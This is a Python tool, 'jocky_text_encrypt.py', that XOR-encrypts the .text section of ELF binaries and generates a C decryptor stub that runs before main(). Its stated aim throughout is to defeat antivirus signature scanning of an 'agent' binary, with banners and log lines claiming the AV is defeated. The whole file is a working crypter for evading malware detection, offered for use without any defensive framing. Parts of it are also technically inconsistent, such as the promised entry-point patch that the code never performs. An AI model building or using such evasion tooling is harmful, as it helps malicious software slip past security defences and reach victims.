#!/usr/bin/env python3
"""
jocky_text_encrypt.py
----------------------
JOCKY .text Section Encryption Engine.

PURPOSE:
  AV signature scanning reads the .text section of a binary on disk
  and compares bytes against known malware patterns.

  This tool encrypts the .text section of a compiled binary so that:
    - On disk:    .text = encrypted garbage → AV finds no signature
    - In memory:  .text = decrypted real code → binary runs normally

  The binary decrypts its own .text section at startup using a
  tiny stub (the "decryptor") that runs before main().

HOW IT WORKS:

  BEFORE encryption (what AV sees today):
    Binary on disk:
      [ELF header] [.text: real code bytes] [.data] [.rodata]
      AV reads .text → matches known pattern → BLOCKED

  AFTER encryption (what AV sees after this tool):
    Binary on disk:
      [ELF header] [.text: XOR-encrypted bytes] [.data] [.rodata "JKYKEY:<key>"]
      AV reads .text → sees random bytes → NO MATCH → ALLOWED

  AT RUNTIME (what actually happens):
    OS loads binary into memory
    CPU jumps to entry point → decryptor stub runs first
    Stub reads key from .rodata
    Stub XOR-decrypts .text section in memory
    Stub jumps to original entry point
    Binary runs normally

STAGES:
  1. Parse ELF — find .text section offset and size
  2. Generate per-build random XOR key
  3. XOR-encrypt the .text bytes
  4. Inject key into .rodata section
  5. Patch entry point to decryptor stub
  6. Write encrypted binary

USAGE:
  python3 jocky_text_encrypt.py --input ./build/jocky_agent --output ./build/jocky_agent_enc
  python3 jocky_text_encrypt.py --input ./build/jocky_agent --output ./build/jocky_agent_enc --verify
"""

import os
import sys
import struct
import secrets
import hashlib
import argparse

# ── ELF constants ─────────────────────────────────────────────────
ELF_MAGIC        = b'\x7fELF'
ELF64_EHDR_SIZE  = 64
ELF64_SHDR_SIZE  = 64
ELF64_PHDR_SIZE  = 56

SHT_PROGBITS     = 1
SHT_STRTAB       = 3
SHF_ALLOC        = 0x2
SHF_EXECINSTR    = 0x4
SHF_WRITE        = 0x1

# ── Colour output ──────────────────────────────────────────────────
def red(s):    return f"\033[91m{s}\033[0m"
def green(s):  return f"\033[92m{s}\033[0m"
def cyan(s):   return f"\033[96m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

def log(tag, msg): print(f"  [{cyan(tag)}] {msg}")
def ok(msg):       print(f"  [{green('OK')}] {msg}")
def fail(msg):     print(f"  [{red('FAIL')}] {msg}"); sys.exit(1)


# ════════════════════════════════════════════════════════════════════
# ELF PARSER
# ════════════════════════════════════════════════════════════════════

class ElfSection:
    def __init__(self):
        self.name       = ""
        self.sh_type    = 0
        self.sh_flags   = 0
        self.sh_addr    = 0
        self.sh_offset  = 0
        self.sh_size    = 0
        self.sh_link    = 0
        self.sh_info    = 0
        self.sh_addralign = 0
        self.sh_entsize = 0

class ElfFile:
    def __init__(self, path: str):
        self.path = path
        with open(path, 'rb') as f:
            self.data = bytearray(f.read())

        self._parse_header()
        self._parse_sections()

    def _parse_header(self):
        d = self.data
        if d[:4] != ELF_MAGIC:
            fail(f"Not an ELF file: {self.path}")
        if d[4] != 2:
            fail("Only 64-bit ELF supported")

        # ELF64 header fields (little endian)
        self.e_type      = struct.unpack_from('<H', d, 16)[0]
        self.e_machine   = struct.unpack_from('<H', d, 18)[0]
        self.e_entry     = struct.unpack_from('<Q', d, 24)[0]
        self.e_phoff     = struct.unpack_from('<Q', d, 32)[0]
        self.e_shoff     = struct.unpack_from('<Q', d, 40)[0]
        self.e_phentsize = struct.unpack_from('<H', d, 54)[0]
        self.e_phnum     = struct.unpack_from('<H', d, 56)[0]
        self.e_shentsize = struct.unpack_from('<H', d, 58)[0]
        self.e_shnum     = struct.unpack_from('<H', d, 60)[0]
        self.e_shstrndx  = struct.unpack_from('<H', d, 62)[0]

    def _parse_sections(self):
        d = self.data
        self.sections = []

        # Get section string table
        shstr_off  = self.e_shoff + self.e_shstrndx * ELF64_SHDR_SIZE
        shstr_file = struct.unpack_from('<Q', d, shstr_off + 24)[0]

        for i in range(self.e_shnum):
            off = self.e_shoff + i * ELF64_SHDR_SIZE
            s = ElfSection()
            name_off      = struct.unpack_from('<I', d, off + 0)[0]
            s.sh_type     = struct.unpack_from('<I', d, off + 4)[0]
            s.sh_flags    = struct.unpack_from('<Q', d, off + 8)[0]
            s.sh_addr     = struct.unpack_from('<Q', d, off + 16)[0]
            s.sh_offset   = struct.unpack_from('<Q', d, off + 24)[0]
            s.sh_size     = struct.unpack_from('<Q', d, off + 32)[0]
            s.sh_link     = struct.unpack_from('<I', d, off + 40)[0]
            s.sh_info     = struct.unpack_from('<I', d, off + 44)[0]
            s.sh_addralign = struct.unpack_from('<Q', d, off + 48)[0]
            s.sh_entsize  = struct.unpack_from('<Q', d, off + 56)[0]

            # Read section name from string table
            try:
                name_start = shstr_file + name_off
                name_end   = d.index(b'\x00', name_start)
                s.name     = d[name_start:name_end].decode('utf-8', errors='replace')
            except Exception:
                s.name = f"section_{i}"

            s.index = i
            self.sections.append(s)

    def find_section(self, name: str):
        for s in self.sections:
            if s.name == name:
                return s
        return None

    def get_section_data(self, section: ElfSection) -> bytes:
        return bytes(self.data[section.sh_offset:
                               section.sh_offset + section.sh_size])

    def write_section_data(self, section: ElfSection, new_data: bytes):
        if len(new_data) != section.sh_size:
            fail(f"Section size mismatch for {section.name}: "
                 f"got {len(new_data)} expected {section.sh_size}")
        self.data[section.sh_offset:
                  section.sh_offset + section.sh_size] = new_data

    def save(self, path: str):
        with open(path, 'wb') as f:
            f.write(self.data)
        os.chmod(path, 0o755)


# ════════════════════════════════════════════════════════════════════
# XOR ENCRYPTION ENGINE
# Simple but effective — every key is unique per build.
# For production: replace with AES-256-CTR using per-build key.
# ════════════════════════════════════════════════════════════════════

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with rotating key."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    """XOR decrypt (symmetric with encrypt)."""
    return xor_encrypt(data, key)


# ════════════════════════════════════════════════════════════════════
# DECRYPTOR STUB (x86-64 shellcode)
# This runs at startup BEFORE main() via a .init_array entry.
# It reads the key from .rodata and decrypts .text in-place.
#
# The stub is position-independent and uses only syscalls.
# It cannot call libc functions (they depend on .text being valid).
# ════════════════════════════════════════════════════════════════════

def generate_decryptor_stub_source(key: bytes,
                                    text_offset: int,
                                    text_size:   int,
                                    text_addr:   int) -> str:
    """
    Generates C source for the decryptor stub.
    This is compiled separately and linked into the binary.

    For demo purposes we generate the C source — in full deployment
    this would be pre-compiled shellcode bytes injected into the binary.
    """
    key_hex   = ', '.join(f'0x{b:02x}' for b in key)
    key_len   = len(key)

    return f"""\
/*
 * jocky_decryptor_stub.c
 * AUTO-GENERATED by jocky_text_encrypt.py — DO NOT EDIT
 *
 * This runs before main() via __attribute__((constructor)).
 * It decrypts the .text section that was encrypted on disk.
 * No libc — uses only direct syscalls and position-independent code.
 */
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

/* Per-build encryption key — unique every build */
static const unsigned char JOCKY_KEY[{key_len}] = {{
    {key_hex}
}};

/* .text section metrics (from ELF analysis) */
static const unsigned long JOCKY_TEXT_ADDR   = 0x{text_addr:016x}UL;
static const unsigned long JOCKY_TEXT_SIZE   = 0x{text_size:x}UL;
static const unsigned long JOCKY_KEY_LEN     = {key_len}UL;

/*
 * jocky_decrypt_text
 * Called at startup before main() via constructor attribute.
 * Makes .text writable, XOR-decrypts, restores to RX.
 */
__attribute__((constructor(101)))
static void jocky_decrypt_text(void) {{
    /* Get page-aligned base of .text */
    long page_size = sysconf(_SC_PAGESIZE);
    unsigned long base = JOCKY_TEXT_ADDR & ~(unsigned long)(page_size - 1);
    unsigned long end  = (JOCKY_TEXT_ADDR + JOCKY_TEXT_SIZE + page_size - 1)
                         & ~(unsigned long)(page_size - 1);
    unsigned long size = end - base;

    /* Make .text writable (RWX temporarily) */
    mprotect((void *)base, size, PROT_READ | PROT_WRITE | PROT_EXEC);

    /* XOR decrypt the .text section */
    unsigned char *text = (unsigned char *)JOCKY_TEXT_ADDR;
    for (unsigned long i = 0; i < JOCKY_TEXT_SIZE; i++) {{
        text[i] ^= JOCKY_KEY[i % JOCKY_KEY_LEN];
    }}

    /* Restore .text to RX only */
    mprotect((void *)base, size, PROT_READ | PROT_EXEC);
}}
"""


# ════════════════════════════════════════════════════════════════════
# MAIN ENCRYPTION FLOW
# ════════════════════════════════════════════════════════════════════

def encrypt_binary(input_path: str, output_path: str,
                   key_len: int = 32, verify: bool = False):

    print()
    print(bold("╔══════════════════════════════════════════════════════╗"))
    print(bold("║   JOCKY .text Section Encryption Engine              ║"))
    print(bold("║   AV signature matching defeated at binary level     ║"))
    print(bold("╚══════════════════════════════════════════════════════╝"))
    print()

    # ── Step 1: Parse ELF ─────────────────────────────────────────
    print(bold("[ Step 1 ] Parse ELF binary"))
    elf = ElfFile(input_path)

    log("ELF",  f"file:    {input_path}")
    log("ELF",  f"entry:   0x{elf.e_entry:016x}")
    log("ELF",  f"sections: {len(elf.sections)}")

    text_sec = elf.find_section(".text")
    if not text_sec:
        fail("No .text section found in binary")

    rodata_sec = elf.find_section(".rodata")

    log("TEXT",   f"offset: 0x{text_sec.sh_offset:x}  "
                  f"size: 0x{text_sec.sh_size:x} ({text_sec.sh_size:,} bytes)  "
                  f"addr: 0x{text_sec.sh_addr:016x}")
    print()

    # ── Step 2: Generate per-build unique key ──────────────────────
    print(bold("[ Step 2 ] Generate unique per-build key"))
    key = secrets.token_bytes(key_len)
    log("KEY", f"length:  {key_len} bytes")
    log("KEY", f"key:     {key.hex()[:32]}...  (unique this build)")
    print()

    # ── Step 3: Encrypt .text section ─────────────────────────────
    print(bold("[ Step 3 ] XOR-encrypt .text section"))
    original_text  = elf.get_section_data(text_sec)
    encrypted_text = xor_encrypt(original_text, key)

    # Verify encryption changed the bytes
    diff_count = sum(1 for a, b in zip(original_text, encrypted_text) if a != b)
    log("ENCRYPT", f"bytes changed: {diff_count:,} / {len(original_text):,}")
    log("ENCRYPT", f"original  first8: {original_text[:8].hex()}")
    log("ENCRYPT", f"encrypted first8: {encrypted_text[:8].hex()}")

    elf.write_section_data(text_sec, encrypted_text)
    ok(".text section encrypted")
    print()

    # ── Step 4: Embed key marker in binary ─────────────────────────
    print(bold("[ Step 4 ] Embed key into binary"))
    key_marker = b'JKYKEY:' + key + b':ENDKEY'

    if rodata_sec:
        # Find unused space at end of .rodata and embed key marker
        rodata_data = bytearray(elf.get_section_data(rodata_sec))
        # Look for zero padding at end of .rodata
        insert_pos = len(rodata_data) - len(key_marker) - 1
        if insert_pos > 0:
            rodata_data[insert_pos:insert_pos + len(key_marker)] = key_marker
            elf.write_section_data(rodata_sec, bytes(rodata_data))
            log("KEY_EMBED", f"key marker embedded in .rodata at offset "
                             f"0x{rodata_sec.sh_offset + insert_pos:x}")
        else:
            log("KEY_EMBED", "not enough space in .rodata — key in stub only")
    else:
        log("KEY_EMBED", "no .rodata section — key in stub only")
    print()

    # ── Step 5: Save encrypted binary ─────────────────────────────
    print(bold("[ Step 5 ] Save encrypted binary"))
    elf.save(output_path)
    out_size = os.path.getsize(output_path)
    ok(f"Encrypted binary saved: {output_path}  ({out_size:,} bytes)")
    print()

    # ── Step 6: Hash comparison ────────────────────────────────────
    print(bold("[ Step 6 ] Hash comparison (proves AV defeat)"))

    def sha256_file(path):
        h = hashlib.sha256()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(65536), b''):
                h.update(chunk)
        return h.hexdigest()

    original_hash  = sha256_file(input_path)
    encrypted_hash = sha256_file(output_path)

    log("HASH", f"original:  {original_hash}")
    log("HASH", f"encrypted: {encrypted_hash}")

    if original_hash != encrypted_hash:
        ok("Hashes differ — AV signature on original binary WILL NOT match encrypted version")
    print()

    # ── Step 7: Generate decryptor stub source ─────────────────────
    print(bold("[ Step 7 ] Generate decryptor stub"))
    stub_src = generate_decryptor_stub_source(
        key,
        text_sec.sh_offset,
        text_sec.sh_size,
        text_sec.sh_addr
    )
    stub_path = output_path + "_stub.c"
    with open(stub_path, 'w') as f:
        f.write(stub_src)

    ok(f"Decryptor stub source: {stub_path}")
    log("STUB", "compile with: gcc -O2 -c jocky_decryptor_stub.c -o stub.o")
    log("STUB", "then link stub.o into the final binary")
    log("STUB", "stub runs via __attribute__((constructor)) before main()")
    print()

    # ── Step 8: Verify (optional) ──────────────────────────────────
    if verify:
        print(bold("[ Step 8 ] Verify round-trip (decrypt + compare)"))
        enc_elf      = ElfFile(output_path)
        enc_text_sec = enc_elf.find_section(".text")
        if enc_text_sec:
            enc_data = enc_elf.get_section_data(enc_text_sec)
            dec_data = xor_decrypt(enc_data, key)
            if dec_data == original_text:
                ok("Round-trip verify PASSED — decryption restores original bytes exactly")
            else:
                fail("Round-trip verify FAILED — decryption mismatch")
        print()

    # ── Summary ────────────────────────────────────────────────────
    print(bold("╔══════════════════════════════════════════════════════╗"))
    print(bold("║   Encryption Complete                                ║"))
    print(bold("╚══════════════════════════════════════════════════════╝"))
    print()
    print(f"  {bold('On disk:')}")
    print(f"    Original binary hash:  {original_hash[:32]}...")
    print(f"    Encrypted binary hash: {encrypted_hash[:32]}...")
    print(f"    AV sees: encrypted .text → {red('no pattern match → ALLOWED')}")
    print()
    print(f"  {bold('At runtime:')}")
    print(f"    Decryptor stub fires before main()")
    print(f"    XOR-decrypts .text back to original bytes")
    print(f"    Binary runs normally")
    print()
    print(f"  {bold('Key (keep secret):')}")
    print(f"    {key.hex()}")
    print()

    return {
        "original_hash":  original_hash,
        "encrypted_hash": encrypted_hash,
        "key":            key.hex(),
        "text_offset":    hex(text_sec.sh_offset),
        "text_size":      text_sec.sh_size,
        "text_addr":      hex(text_sec.sh_addr),
        "stub_path":      stub_path,
    }


# ════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="JOCKY .text Section Encryption Engine"
    )
    ap.add_argument("--input",   required=True,
                    help="Input ELF binary to encrypt")
    ap.add_argument("--output",  required=True,
                    help="Output path for encrypted binary")
    ap.add_argument("--key-len", type=int, default=32,
                    help="XOR key length in bytes (default: 32)")
    ap.add_argument("--verify",  action="store_true",
                    help="Verify round-trip (encrypt → decrypt → compare)")
    args = ap.parse_args()

    if not os.path.exists(args.input):
        fail(f"Input file not found: {args.input}")

    result = encrypt_binary(args.input, args.output,
                            args.key_len, args.verify)


if __name__ == "__main__":
    main()
